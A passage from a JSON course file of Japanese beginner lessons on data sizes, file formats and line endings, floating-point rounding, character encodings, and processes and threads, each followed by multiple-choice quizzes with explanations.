| `#ff8800` | 赤 ff（255）・緑 88（136）・青 00（0）＝ オレンジ |\n| 文字のバイト列 | `b'\\xe3\\x81\\x82'` | 「あ」の UTF-8 での 3 バイト（レッスン 5） |\n| Git のコミット ID | `9f1d485` | 長い 16 進数の先頭 7 文字 |\n| UUID | `11111111-2222-3333-...` | 16 進数 32 文字のランダムな ID |\n| メモリの番地 | `<object at 0x7f3a2c...>` | Python がオブジェクトを表示したときの置き場所 |\n\nJavaScript でも `0xff`・`0b1010` と書けます。変換は `(255).toString(2)` → `\"11111111\"`、`parseInt(\"ff\", 16)` → `255` です（実行して確認）。\n\n## データの量：KB と KiB\n\n| 単位 | 1000 で数える（SI） | 1024 で数える（2 進） |\n|---|---|---|\n| キロ | 1 **KB** = 1,000 バイト | 1 **KiB** = 1,024 バイト |\n| メガ | 1 **MB** = 1,000,000 バイト | 1 **MiB** = 1,048,576 バイト |\n| ギガ | 1 **GB** = 10 億バイト | 1 **GiB** = 約 10.7 億バイト |\n\n本来は区別しますが、実際には **1024 で数えているのに KB・MB と書く** ことがよくあります（Windows のエクスプローラーなど）。\n「500GB の SSD を買ったのに、Windows では 465GB と表示される」のは、メーカーが 1000 で、Windows が 1024 で数えているためです。\n\n### 量の感覚\n\n| もの | だいたいの大きさ |\n|---|---|\n| 半角英数字 1 文字 | 1 バイト |\n| 日本語 1 文字（UTF-8） | 3 バイト |\n| テキストだけのメール | 数 KB |\n| スマホの写真 1 枚 | 数 MB |\n| 1 時間の動画 | 数 GB |\n\n## AI のコードではこう出てくる\n\n```python\nMAX_UPLOAD = 5 * 1024 * 1024      # 5MiB（5MB と書かれていることが多い）\nif len(data) > MAX_UPLOAD:\n    raise ValueError(\"ファイルが大きすぎます\")\n```\n\n`1024 * 1024` を見たら「メガ」、`1024 ** 3` を見たら「ギガ」と読めば OK です。\n`chmod 755`（ファイルの権限）、`0o755` のような数字は **8 進数**（8 で繰り上がる）で、3 ビットずつまとめた書き方です。ターミナルと Git のコースで出てきます。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "1 バイトで表せる種類はいくつ？",
        "choices": [
         "8 通り",
         "16 通り",
         "256 通り"
        ],
        "answer": 2,
        "explain": "1 バイトは 8 ビットなので、2 を 8 回かけた 256 通り（0〜255）です。"
       },
       {
        "question": "CSS の色 `#00ff00` は何色？",
        "choices": [
         "赤",
         "緑",
         "青"
        ],
        "answer": 1,
        "explain": "2 文字ずつ 赤・緑・青 の順です。00 / ff / 00 なので、緑だけが最大の色です。"
       },
       {
        "question": "`5 * 1024 * 1024` は何を表している可能性が高い？",
        "choices": [
         "5 キロバイト",
         "5 メガバイト（正確には 5MiB）",
         "5 ギガバイト"
        ],
        "answer": 1,
        "explain": "1024 を 2 回かけると「メガ」、3 回かけると「ギガ」です。"
       }
      ]
     ],
     "id": "02-binary-data-size"
    },
    {
     "title": "ファイルの正体 ― テキストとバイナリ・拡張子・改行",
     "level": 1,
     "minutes": 14,
     "concepts": [
      "hardware",
      "io",
      "encoding"
     ],
     "summary": "ファイルは「名前の付いたバイトの並び」。テキストとバイナリの違い、拡張子の本当の意味、Windows と Mac で違う改行コード。",
     "body": "## このレッスンのゴール\n\n- ファイルが「バイトの並び」であることと、テキストファイル・バイナリファイルの違いを説明できる\n- 拡張子が何を決めていて、何を決めていないかが分かる\n- `open(..., \"rb\")`・改行コード `\\r\\n` が出てくるコードを読める\n\n場所（パス）の書き方は、ターミナルと Git のコースのレッスン 1 でくわしく扱います。\n\n## ファイル ＝ 名前の付いたバイトの並び\n\nストレージ（レッスン 1 の本棚）に入っているのは、どんなファイルも **バイト（0〜255 の数）の並び** です。\nその並びを「文字として読む約束」で作ったものが **テキストファイル**、それ以外が **バイナリファイル** です。\n\n| | テキストファイル | バイナリファイル |\n|---|---|---|\n| 中身 | 文字コード（レッスン 5）で文字を表したバイト | 画像・音声・圧縮データなど、文字ではないバイト |\n| 例 | `.py` `.js` `.txt` `.csv` `.json` `.md` `.html` | `.png` `.jpg` `.mp3` `.zip` `.xlsx` `.exe` |\n| メモ帳で開くと | 読める | 意味不明な記号だらけ |\n\n```python\nwith open(\"memo.txt\", \"rb\") as f:        # \"rb\" = バイトのまま読む（read binary）\n    print(f.read())\n# b'\\xe8\\xb2\\xb7\\xe3\\x81\\x84\\xe7\\x89\\xa9\\n\\xe3\\x82\\x8a...'   ← 「買い物」「りんご」の UTF-8\n\nwith open(\"photo.png\", \"rb\") as f:\n    print(f.read(8))                      # 先頭 8 バイトだけ\n# b'\\x89PNG\\r\\n\\x1a\\n'                   ← PNG 画像は必ずこの 8 バイトで始まる\n```\n\n（どちらも実際に実行した結果です。`b'...'` はバイト列、`\\xe8` は 16 進数で書いた 1 バイト。レッスン 2）\n\n### 画像をテキストとして開くと\n\n```python\nopen(\"photo.png\", encoding=\"utf-8\").read()\n# UnicodeDecodeError: 'utf-8' codec can't decode byte 0x89 in position 0: invalid start byte\n```\n\n「0 番目のバイト 0x89 は UTF-8 の文字として読めません」というエラーです。画像はバイナリなので、`\"rb\"` で開く必要があります。\n\n| `open` のモード | 意味 | 返ってくるもの |\n|---|---|---|\n| `\"r\"`（省略時） | テキストとして読む | `str`（文字列） |\n| `\"w\"` | テキストとして書く（**中身を消してから**） | |\n| `\"a\"` | テキストとして末尾に追加 | |\n| `\"rb\"` / `\"wb\"` | バイトのまま読む／書く | `bytes` |\n\n⚠️ `\"w\"` は、開いた瞬間に元の中身が消えます。AI のコードで、大事なファイルを `\"w\"` で開いていないか確認しましょう。\n\n## 拡張子は「名札」にすぎない\n\n`report.final.csv` の **最後の `.` から後ろ（`.csv`）が拡張子** です。\n\n```python\nfrom pathlib import Path\np = Path(\"data/2026/report.final.csv\")\np.name     # 'report.final.csv'\np.stem     # 'report.final'\np.suffix   # '.csv'\np.parent   # data/2026\n```\n\n拡張子が決めているのは、**どのアプリで開くか（OS の目安）だけ** です。中身は変わりません。\n\n- `photo.png` を `photo.txt` に名前を変えても、中身は画像のまま（テキストとして読むと上と同じエラーになることを確認しました）\n- だから、アップロードされたファイルを **拡張子だけで判断するのは危険** です。`.jpg` という名前のプログラムが送られてくることもあります\n\n⚠️ Windows は初期設定で **拡張子を隠します**。`memo.txt` が `memo` と表示され、`memo.txt.txt` のような二重の名前に気づけないことがあります。エクスプローラーの「表示」→「ファイル名拡張子」をオンにしておくのがおすすめです。\n\n## 隠しファイル\n\n名前が `.` で始まるファイルやフォルダ（`.git`、`.env`、`.gitignore`）は、Mac や Linux では **隠しファイル** として扱われ、普段は見えません。\n開発ではこれらが重要な役割を持ちます（`.env` は秘密情報、`.git` は Git の記録）。「無いはず」のファイルが実はあることがあるので注意しましょう。\n\n## 改行コード：Windows だけ違う\n\nテキストの「改行」も、実はバイトです。\n\n| OS | 改行のバイト | 書き方 |\n|---|---|---|\n| Mac・Linux | 1 バイト（0x0a） | `\\n`（LF） |\n| Windows（昔からの習慣） | 2 バイト（0x0d 0x0a） | `\\r\\n`（CRLF） |\n\n```python\nopen(\"w.txt\", \"w\", encoding=\"utf-8\", newline=\"\\r\\n\").write(\"a\\nb\\n\")\nopen(\"w.txt\", \"rb\").read()       # b'a\\r\\nb\\r\\n'   ← \\n が \\r\\n で保存された\n```\n\nPython は普段、OS に合わせて自動で変換してくれます。困るのは次のような場面です。\n\n- Git の差分で、**中身は変えていないのに全行が「変更あり」** になる（改行コードだけが変わった）\n- Windows で作ったシェルスクリプトを Linux で動かすと `$'\\r': command not found` というエラーが出る\n- CSV の行の最後に、見えない `\\r` が残る\n\nこのリポジトリにも、改行コードをそろえるための `.gitattributes` というファイルが入っています。\n\n## AI のコードではこう出てくる\n\n| 書き方 | 読み方 |\n|---|---|\n| `open(path, \"rb\")` / `\"wb\"` | 画像・PDF・zip などをバイトのまま扱っている |\n| `Path(...).suffix.lower() == \".png\"` | 拡張子で判定している（名札だけを見ている） |\n| `encoding=\"utf-8\"` | テキストの文字コードを指定（レッスン 5。付いていないと Windows で文字化けすることがある） |\n| `newline=\"\"` | CSV を書くときの定番。`csv` モジュールに改行を任せる |\n| `.strip()` | 行の最後の `\\n`・`\\r\\n`・空白を取り除く |\n\nJavaScript（Node.js）では、`fs.readFileSync(path)` がバイト（Buffer）、`fs.readFileSync(path, \"utf8\")` が文字列を返します。Python の `\"rb\"` と `\"r\"` の違いと同じです。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`photo.png` の名前を `photo.txt` に変えたら、中身はどうなる？",
        "choices": [
         "テキストファイルに変換される",
         "中身は画像のバイトのまま変わらない",
         "ファイルが壊れて開けなくなる"
        ],
        "answer": 1,
        "explain": "拡張子は名札にすぎません。中身のバイトは同じなので、テキストとして読もうとするとエラーになります。"
       },
       {
        "question": "画像ファイルを読むときの正しい `open` のモードは？",
        "choices": [
         "`\"r\"`",
         "`\"w\"`",
         "`\"rb\"`"
        ],
        "answer": 2,
        "explain": "画像はバイナリなので、文字として読まずにバイトのまま読みます（read binary）。"
       },
       {
        "question": "Windows で編集しただけなのに、Git で全部の行が変更扱いになった。考えられる原因は？",
        "choices": [
         "改行コードが LF から CRLF に変わった",
         "ファイルの拡張子が変わった",
         "Git が壊れた"
        ],
        "answer": 0,
        "explain": "改行も 1 つのバイトです。`\\n` が `\\r\\n` に変わると、全行が別の内容として扱われます。"
       }
      ]
     ],
     "id": "03-files"
    },
    {
     "title": "数値の落とし穴 ― 0.1 + 0.2 が 0.3 にならない",
     "level": 2,
     "minutes": 15,
     "concepts": [
      "encoding",
      "types",
      "operators"
     ],
     "summary": "小数の誤差、四捨五入のずれ、JavaScript の大きな整数。お金や ID を扱う AI のコードで必ず見るポイント。",
     "body": "## このレッスンのゴール\n\n- `0.1 + 0.2` がぴったり `0.3` にならない理由を説明できる\n- お金の計算で、AI のコードが誤差に対応しているか確認できる\n- JavaScript で大きな整数（ID など）が化ける理由が分かる\n\n## 0.1 + 0.2 = 0.30000000000000004\n\n```python\nprint(0.1 + 0.2)           # 0.30000000000000004\nprint(0.1 + 0.2 == 0.3)    # False\n```\n\nバグではなく、Python・JavaScript・Java など **ほぼすべての言語で同じ結果** になります（Python と JavaScript で実行して確認）。\n\n### 理由：2 進数では 0.1 を正確に書けない\n\n10 進数で 1/3 を書くと `0.3333…` と永遠に続くように、**2 進数（レッスン 2）では 0.1 が永遠に続く** 小数になります。\nコンピュータは小数（`float`）を決まった桁数（64 ビット）で持つので、途中で切った **ほんの少しずれた値** を覚えています。\n\n```python\nfrom decimal import Decimal\nprint(Decimal(0.1))\n# 0.1000000000000000055511151231257827021181583404541015625   ← 実際に覚えている値\n```\n\n普段は表示のときに丸められて `0.1` に見えますが、計算を重ねるとずれが表に出てきます。\n\n## 対策 1：小数を `==` で比べない\n\n```python\nimport math\nmath.isclose(0.1 + 0.2, 0.3)      # True  「ほぼ等しい」で比べる\n```\n\nJavaScript では `Math.abs(a - b) < Number.EPSILON` のように書きます。\n\n## 対策 2：お金は小数で計算しない\n\n| 方法 | 例 | 使う場面 |\n|---|---|---|\n| **整数（いちばん小さい単位）で持つ** | 1980 円は `1980`、12.34 ドルは `1234`（セント） | 多くの決済サービス（Stripe など）が採用 |\n| **`Decimal` を使う**（Python） | `Decimal(\"0.1\") + Decimal(\"0.2\")` → `Decimal('0.3')` | 税率・利率などの計算 |\n| データベースの `DECIMAL` / `NUMERIC` 型 | `price NUMERIC(10, 2)` | 金額の列 |\n\n```python\nDecimal(\"0.1\") + Decimal(\"0.2\")   # Decimal('0.3')     ← 文字列から作る\nDecimal(0.1)                      # 0.1000000000000000055…  ← float から作るとずれごと入る\n```\n\n⚠️ `Decimal(0.1)` のように **float から作ると意味がありません**。必ず文字列 `\"0.1\"` から作ります。\n\n## 四捨五入も思いどおりにならない\n\n```python\nround(2.5)       # 2   ← 3 ではない！\nround(3.5)       # 4\nround(0.125, 2)  # 0.12\n```\n\n```javascript\nMath.round(2.5)      // 3\nMath.round(-2.5)     // -2\n(1.005).toFixed(2)   // \"1.00\"  ← 1.01 ではない\n```\n\n（すべて実行して確認した結果です）\n\n| 何が起きているか | 説明 |\n|---|---|\n| Python の `round(2.5)` が 2 | 「ちょうど半分なら偶数のほうへ丸める」方式（銀行家の丸め）。誤差がたまりにくい |\n| `(1.005).toFixed(2)` が `\"1.00\"` | 1.005 が実際には 1.00499999… として覚えられているため |\n| JavaScript の `Math.round(-2.5)` が -2 | 「大きいほうへ」丸めるので、マイナスでは 0 に近づく |\n\n学校で習う「四捨五入」が必要なら、Python では `Decimal` の `quantize(..., rounding=ROUND_HALF_UP)` を使います。\n**税込み価格の計算など、1 円のずれが問題になる場面** では、AI のコードがどの丸め方を使っているかを必ず確認しましょう。\n\n## 整数の大きさ：Python は無限、JavaScript は限界あり\n\n```python\nprint(2 ** 64)     # 18446744073709551616   Python の整数はいくらでも大きくできる\n```\n\n```javascript\nconsole.log(Number.MAX_SAFE_INTEGER)   // 9007199254740991（約 9000 兆）\nconsole.log(9007199254740993)          // 9007199254740992  ← 1 ずれた！\nconsole.log(9007199254740993n)         // 9007199254740993n ← BigInt なら正確\n```\n\nJavaScript の普通の数（`Number`）は、中身が小数（float）なので、約 9000 兆を超えると **整数でもずれます**。\n\n⚠️ これが実際に問題になるのは **ID** です。X（旧 Twitter）や Discord の ID は 19 桁ほどあり、JSON の数値のまま JavaScript で読むと、下の桁が変わって別の ID になります。そのため、多くの API は ID を **文字列** `\"1234567890123456789\"` で返します。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `price * 1.1` で税込み計算 | ⚠️ 誤差と丸め方。整数や `Decimal` にしているか |\n| `if total == 0.3:` | ⚠️ 小数を `==` で比べている。`math.isclose` か整数に |\n| `round(x)` で四捨五入のつもり | ⚠️ Python は偶数への丸め。必要なら `ROUND_HALF_UP` |\n| JavaScript で `JSON.parse` した大きな ID | ⚠️ 数値のままだとずれる。文字列で受け取っているか |\n| `Decimal(\"19.99\")` / 金額を整数のセントで保存 | ✅ |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "Python で `0.1 + 0.2 == 0.3` が `False` になる理由は？",
        "choices": [
         "Python のバグ",
         "2 進数では 0.1 などを正確に表せず、わずかな誤差があるから",
         "足し算の順番が決まっていないから"
        ],
        "answer": 1,
        "explain": "0.1 は 2 進数で無限に続く小数になるため、決まった桁数で切ったずれた値を覚えています。ほぼすべての言語で同じです。"
       },
       {
        "question": "お金の計算の方法として適切なのは？",
        "choices": [
         "`float` で計算し、最後に `round` する",
         "円やセントの整数で持つか、文字列から作った `Decimal` を使う",
         "`Decimal(0.1)` のように float から Decimal を作る"
        ],
        "answer": 1,
        "explain": "整数で持てば誤差はありません。Decimal は必ず文字列から作ります（float から作ると誤差ごと入ります）。"
       },
       {
        "question": "JavaScript で 19 桁の ID を数値のまま扱うと、何が起きうる？",
        "choices": [
         "自動で BigInt に変換される",
         "エラーで止まる",
         "エラーは出ずに、下の桁が変わって別の値になる"
        ],
        "answer": 2,
        "explain": "約 9000 兆（`Number.MAX_SAFE_INTEGER`）を超えると整数でも正確に表せません。エラーが出ないので気づきにくいのが怖いところです。"
       }
      ]
     ],
     "id": "04-numbers-float"
    },
    {
     "title": "文字コードと文字化け ― UTF-8 と Shift_JIS",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "encoding",
      "strings",
      "io"
     ],
     "summary": "文字を数（バイト）に変える約束が文字コード。文字化けが起きる仕組みと、Windows・Excel・CSV でよくあるトラブルの直し方。",
     "body": "## このレッスンのゴール\n\n- 文字コードとは何か、UTF-8 と Shift_JIS（cp932）の違いを説明できる\n- 文字化けを見て、だいたいの原因を推測できる\n- `encoding=\"utf-8\"`・`utf-8-sig`・`UnicodeDecodeError` が出てくるコードを読める\n\n## 文字コード ＝ 文字と数の対応表\n\nコンピュータは数しか扱えない（レッスン 2）ので、文字にも番号を付けます。\n\n```python\nord(\"A\")    # 65\nchr(65)     # 'A'\nord(\"あ\")   # 12354（16 進数で 0x3042）\n```\n\n世界中の文字に 1 つずつ番号を付けた表が **Unicode** です。「あ」は U+3042 番です。\nただし、番号を **ファイルに保存するときのバイトの並べ方** には何種類かあり、これを **文字コード（エンコーディング）** と呼びます。\n\n| 文字コード | 「あ」のバイト | 特徴 |\n|---|---|---|\n| **UTF-8** | `e3 81 82`（3 バイト） | 世界標準。Web・Mac・Linux・Python・Git の標準 |\n| **Shift_JIS**（Windows では **cp932**） | `82 a0`（2 バイト） | 日本の昔からの文字コード。古い Windows アプリや Excel の CSV で今も使われる |\n| ASCII | 無し（英数字だけ） | 英数字と記号だけの 128 文字。UTF-8 の英数字部分と同じ |\n\n```python\n\"abc\".encode()             # 3 バイト（英数字は 1 文字 1 バイト）\n\"あ\".encode()              # b'\\xe3\\x81\\x82'（UTF-8 で 3 バイト）\n\"あ\".encode(\"cp932\")       # 2 バイト\n\"😀\".encode()              # 4 バイト（絵文字は 4 バイト）\n```\n\n- **encode**（エンコード）：文字列 → バイト。保存・送信するとき\n- **decode**（デコード）：バイト → 文字列。読み込むとき\n\n## 文字化けの正体\n\n**書いたときと違う文字コードで読む** と、文字化けします。\n\n```python\n\"こんにちは\".encode(\"utf-8\").decode(\"cp932\")\n# '縺薙ｓ縺ｫ縺｡縺ｯ'          ← UTF-8 で書いたものを Shift_JIS で読んだ\n\n\"こんにちは\".encode(\"cp932\").decode(\"utf-8\")\n# UnicodeDecodeError: 'utf-8' codec can't decode byte 0x82 in position 0: invalid start byte\n\n\"文字化け\".encode(\"utf-8\").decode(\"latin-1\")\n# 'æ\\x96\\x87å\\xad\\x97...'   ← UTF-8 を西欧の文字コードで読んだ\n```\n\n（すべて実行して確認しました）\n\n### 化け方で原因が分かる\n\n| 見え方 | よくある原因 |\n|---|---|\n| `縺薙ｓ縺ｫ…`（「縺」がたくさん） | **UTF-8** のファイルを **Shift_JIS** で開いた（Windows のメモ帳の古い版・Excel） |\n| `�` や `?` だらけ | 読めないバイトを置き換えた（`errors=\"replace\"`）。そもそも文字コードが違う |\n| `ã“ã‚“…`・`æ–‡å­—` | UTF-8 を西欧の文字コード（latin-1 など）で読んだ |\n| `UnicodeDecodeError: 'utf-8' codec can't decode byte 0x82` | **Shift_JIS** のファイルを UTF-8 で読もうとした（0x82 は Shift_JIS のひらがなによく出るバイト） |\n\n## Windows でよくあるトラブル\n\n### ① `open()` で `encoding` を書かない\n\n```python\nopen(\"memo.txt\").read()                     # ⚠️ OS によって読み方が変わる\nopen(\"memo.txt\", encoding=\"utf-8\").read()   # ✅ いつも UTF-8\n```\n\n`encoding` を省略すると、**OS の標準の文字コード** で読みます。Mac・Linux は UTF-8 ですが、日本語の Windows では cp932 になることがあり、Mac で動いたコードが Windows で `UnicodeDecodeError` になります（Python 3.15 で標準を UTF-8 にする変更が入りますが、それより古い Python もまだ多く使われています）。\n**テキストファイルを開くときは、`encoding=\"utf-8\"` を必ず書く** のが安全です。\n\n### ② Excel で CSV を開くと文字化けする\n\nExcel は、目印の無い CSV を Shift_JIS だと思って開きます。そこで、ファイルの先頭に **BOM**（「これは UTF-8 です」という 3 バイトの目印 `ef bb bf`）を付けます。\n\n```python\nimport csv\nwith open(\"out.csv\", \"w\", encoding=\"utf-8-sig\", newline=\"\") as f:   # utf-8-sig = BOM 付き UTF-8\n    csv.writer(f).writerows([[\"名前\", \"金額\"], [\"りんご\", 120]])\n```\n\n逆に、BOM 付きのファイルを普通の `utf-8` で読むと、最初の列名の前に見えない文字 `﻿` が付いて、`row[\"id\"]` が見つからない（`KeyError`）といったことが起きます。読むときも `utf-8-sig` にすると、BOM があってもなくても読めます。\n\n### ③ Shift_JIS のファイルを読む\n\n```python\nopen(\"old.csv\", encoding=\"cp932\").read()\n```\n\n`shift_jis` より `cp932` のほうが安全です。cp932 は Windows 独自の文字（`①`・`髙` など）も読めますが、`shift_jis` だと `UnicodeEncodeError` などになります（`\"①髙\".encode(\"shift_jis\")` がエラーになることを確認しました）。\n\n## 文字数とバイト数は違う\n\n```python\nlen(\"あ\")            # 1（文字数）\nlen(\"あ\".encode())   # 3（バイト数）\nlen(\"😀\")            # 1\n```\n\n```javascript\n\"あ\".length          // 1\n\"😀\".length          // 2   ← JavaScript は 1 になるとは限らない\n[...\"😀\"].length     // 1\n```\n\nJavaScript の `.length` は、絵文字などを 2 と数えることがあります。「20 文字まで」の入力チェックや、データベースの「100 バイトまで」の列で、思ったより早く上限に届くのはこのためです。\n\n## AI のコードではこう出てくる\n\n| 書き方 | チェック |\n|---|---|\n| `open(path)`（`encoding` 無し） | ⚠️ Windows で化ける可能性。`encoding=\"utf-8\"` を |\n| `encoding=\"utf-8-sig\"` | ✅ Excel 向けの CSV、または BOM 付きでも読めるように |\n| `encoding=\"cp932\"` | 古い Windows のファイルや、日本の銀行・役所の CSV を読んでいる |\n| `errors=\"ignore\"` / `errors=\"replace\"` | ⚠️ 読めない文字を **黙って消す／置き換える**。データが欠けても気づけない |\n| `requests` の `resp.text` が化ける | `resp.encoding = \"utf-8\"` を設定するか、`resp.content.decode(...)` |\n| HTML の `<meta charset=\"utf-8\">` | ✅ ブラウザに文字コードを伝えている |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "画面に「縺薙ｓ縺ｫ縺｡縺ｯ」と表示された。いちばん考えられる原因は？",
        "choices": [
         "UTF-8 で保存されたものを Shift_JIS として読んだ",
         "Shift_JIS で保存されたものを UTF-8 として読んだ",
         "ファイルが壊れている"
        ],
        "answer": 0,
        "explain": "「縺」が並ぶのは、UTF-8 の日本語を Shift_JIS（cp932）で読んだときの典型的な化け方です。"
       },
       {
        "question": "Python で作った CSV を Excel で開くと文字化けする。直し方として適切なのは？",
        "choices": [
         "`encoding=\"ascii\"` で書く",
         "`encoding=\"utf-8-sig\"`（BOM 付き UTF-8）で書く",
         "`errors=\"ignore\"` を付ける"
        ],
        "answer": 1,
        "explain": "Excel は BOM という目印があると UTF-8 として開きます。`utf-8-sig` で書くと BOM が付きます。"
       },
       {
        "question": "`open(\"data.txt\").read()` が Mac では動いたのに、Windows で `UnicodeDecodeError` になった。理由は？",
        "choices": [
         "Windows では `open` が使えない",
         "ファイルが大きすぎる",
         "`encoding` を省略すると OS の標準の文字コードで読むため、Windows では UTF-8 以外で読もうとした"
        ],
        "answer": 2,
        "explain": "省略時の文字コードは OS によって違います。`encoding=\"utf-8\"` を明示すれば、どこでも同じように読めます。"
       }
      ]
     ],
     "id": "05-encoding"
    },
    {
     "title": "プロセスとスレッド ― 同時に動くプログラム",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "hardware",
      "async",
      "performance"
     ],
     "summary": "実行中のプログラム（プロセス）と、その中の作業の流れ（スレッド）。「ポートが使用中」「Ctrl+C」「同時に書き換えて数がずれる」の正体。",
     "body": "## このレッスンのゴール\n\n- プログラム・プロセス・スレッドの違いを説明できる\n- `Address already in use` や「プロセスを終了する」の意味が分かる\n- スレッドを使う AI のコードで、データの取り合い（競合）に気づける\n\n## プログラムとプロセス\n\n| | たとえ | 説明 |\n|---|---|---|\n| **プログラム** | レシピ本 | ストレージに保存されたファイル（`main.py`、`chrome.exe`） |\n| **プロセス** | 実際に料理している台所 | プログラムを **実行している最中のもの**。メモリの一部をもらって動く |\n| **スレッド** | 台所で働く料理人 | プロセスの中で、命令を順番に実行していく流れ。1 つのプロセスに 1 人以上いる |\n\n同じプログラムでも、2 回起動すれば **プロセスは 2 つ** になります（ブラウザのウィンドウを 2 つ開くなど）。\nOS は、それぞれのプロセスに **番号（PID）** と **専用のメモリ** を割り当てます。あるプロセスが他のプロセスのメモリを勝手に読んだり壊したりできないようになっています。\n\n```python\nimport os\nprint(os.getpid())       # 1293 などの PID（実行するたびに変わる）\nprint(os.cpu_count())    # CPU のコア（同時に計算できる数）。この環境では 4\n```\n\n### プロセスを見る・止める\n\n| やりたいこと | Windows | Mac / Linux |\n|---|---|---|\n| 一覧を見る | タスクマネージャー（Ctrl+Shift+Esc） | アクティビティモニタ／`ps`・`top` |\n| 実行中のプログラムを止める | ターミナルで **Ctrl+C** | ターミナルで **Ctrl+C** |\n| 番号を指定して止める | `taskkill /PID 1234` | `kill 1234` |\n\n`npm run dev` や `uvicorn` で起動したサーバーが、ターミナルを占領したまま戻ってこないのは、**プロセスが動き続けている** からです。Ctrl+C で止めます。\n\n## 「ポートがすでに使われています」\n\n```text\nOSError: [Errno 98] Address already in use\nError: listen EADDRINUSE: address already in use :::3000\n```\n\n（上は、同じポートを 2 回使おうとして実際に出したエラーです）\n\n1 つのポート（バックエンドコースのレッスン 2 の「部屋番号」）は、**1 つのプロセスしか使えません**。\nこのエラーのほとんどは、**前に起動したサーバーがまだ動いている** のが原因です。\n\n- 前のターミナルで Ctrl+C を押し忘れていないか確認する\n- 見つからなければ、そのポートを使っているプロセスを探して止める（Windows：`netstat -ano | findstr :3000`、Mac/Linux：`lsof -i :3000`）\n- または、別のポートで起動する（`--port 8001`）\n\n## スレッド：1 つのプロセスの中で同時に進める\n\n待ち時間の多い仕事（ダウンロード・API の呼び出し）は、料理人を増やすと速くなります。\n\n```python\nimport time\nfrom concurrent.futures import ThreadPoolExecutor\n\ndef wait(n):\n    time.sleep(1)          # 1 秒かかる通信の代わり\n    return n\n\nfor i in range(4):         # 順番に：約 4.0 秒\n    wait(i)\n\nwith ThreadPoolExecutor(4) as ex:            # 4 つのスレッドで：約 1.0 秒\n    print(list(ex.map(wait, range(4))))      # [0, 1, 2, 3]\n```\n\n（実際に測った時間です）\n\n## スレッドの落とし穴：同じデータの取り合い\n\nスレッドどうしは **同じメモリ（変数）を共有** します。これは便利な反面、危険でもあります。\n\n```python\nimport threading, time\n\ncounter = 0\ndef add():\n    global counter\n    for _ in range(1000):\n        v = counter          # ① 今の値を読む\n        time.sleep(0)        #    （ここで他のスレッドに順番が回りやすくする）\n        counter = v + 1      # ② 1 足して書き戻す\n\nthreads = [threading.Thread(target=add) for _ in range(4)]\nfor t in threads: t.start()\nfor t in threads: t.join()\nprint(counter)               # 4000 になるはずが… 1002（実行した結果）\n```\n\n2 つのスレッドが **同じ値を読んでから**、それぞれ 1 足して書き戻すと、2 回足したのに 1 しか増えません。これを **競合状態（レースコンディション）** と呼びます。\nタイミング次第で起きたり起きなかったりするので、**テストでは見つかりにくい** のが厄介なところです。\n\n### 直し方：ロック（鍵）を使う\n\n```python\nlock = threading.Lock()\ndef add():\n    global counter\n    for _ in range(1000):\n        with lock:           # 鍵を持っている 1 人だけが中に入れる\n            counter += 1\n```\n\n同じことは、Web サーバーで 2 人が同時に「残り 1 個の商品」を買うときにも起きます。データベースでは **トランザクション**（データベース設計のコース）で防ぎます。\n\n## プロセス・スレッド・async の使い分け\n\n| 方法 | Python | 向いている仕事 |\n|---|---|---|\n| **複数のプロセス** | `multiprocessing`、`ProcessPoolExecutor` | 計算が重い（画像処理・大量の計算）。CPU のコアを全部使える |\n| **複数のスレッド** | `threading`、`ThreadPoolExecutor` | 待ち時間が多い（通信・ファイル） |\n| **async / await** | `asyncio`（Python コースのレッスン 13） | 待ち時間が多い。1 つのスレッドで大量の通信をさばく |\n\nPython には **GIL** という仕組みがあり、普通の Python ではスレッドを増やしても **計算そのものは同時に 1 つしか進みません**（Python 3.13 から GIL を外した版も試験的に提供されています）。\nそのため「重い計算はプロセス、待ちが多い仕事はスレッドか async」と使い分けます。\n\nJavaScript は基本的に **1 つのスレッド** で動き、待ち時間は `async` / `await`（Promise）で処理します。重い計算は Web Worker や Node.js の `worker_threads` で別のスレッドに回します。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `threading.Thread` / `ThreadPoolExecutor` で共有の変数やリストを書き換えている | ⚠️ ロックがあるか。結果を `return` で集める形のほうが安全 |\n| `ProcessPoolExecutor` | 重い計算を CPU のコアに分けている。`if __name__ == \"__main__\":` が必要（Windows では特に） |\n| `Address already in use` / `EADDRINUSE` | 前のサーバーが動いたまま。Ctrl+C か、プロセスを止める |\n| `kill -9` / `taskkill /F` | 強制終了。保存処理が途中で止まる可能性がある |\n| 「在庫を読む → 減らして書く」を 2 回に分けている | ⚠️ 同時に買われると在庫がずれる。データベースで 1 回の更新にするか、トランザクションに |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "同じプログラムを 2 回起動すると、プロセスはいくつになる？",
        "choices": [
         "1 つ（同じプログラムなので共有される）",
         "2 つ（それぞれ別の PID とメモリを持つ）",
         "0 個（2 回目は起動できない）"
        ],
        "answer": 1,
        "explain": "プロセスは「実行中のもの」なので、起動した回数だけできます。"
       },
       {
        "question": "`npm run dev` で `EADDRINUSE: address already in use :::3000` と出た。まず確認することは？",
        "choices": [
         "Node.js を入れ直す",
         "前に起動したサーバーが別のターミナルで動いたままになっていないか",
         "パソコンのメモリを増やす"
        ],
        "answer": 1,
        "explain": "1 つのポートは 1 つのプロセスしか使えません。前のサーバーを Ctrl+C で止めるか、別のポートで起動します。"
       },
       {
        "question": "4 つのスレッドで共有の変数 `counter` に 1000 回ずつ足したのに、4000 より小さくなった。原因は？",
        "choices": [
         "スレッドは足し算ができない",
         "Python の整数に上限があるから",
         "複数のスレッドが同じ値を読んでから書き戻したため、足した分が消えた（競合状態）"
        ],
        "answer": 2,
        "explain": "「読む → 足す → 書く」の間に他のスレッドが割り込むと、更新が失われます。ロックで 1 人ずつにするか、共有の値を書き換えない作りにします。"
       }
      ]
     ],
     "id": "06-process-thread"
    }
   ],
   "status": "open"
  }
 ],
 "explanations": [
  {
   "title": "popup2027 の全体像 ― チームでポップアップを準備する共有アプリ",
   "language": "JavaScript",
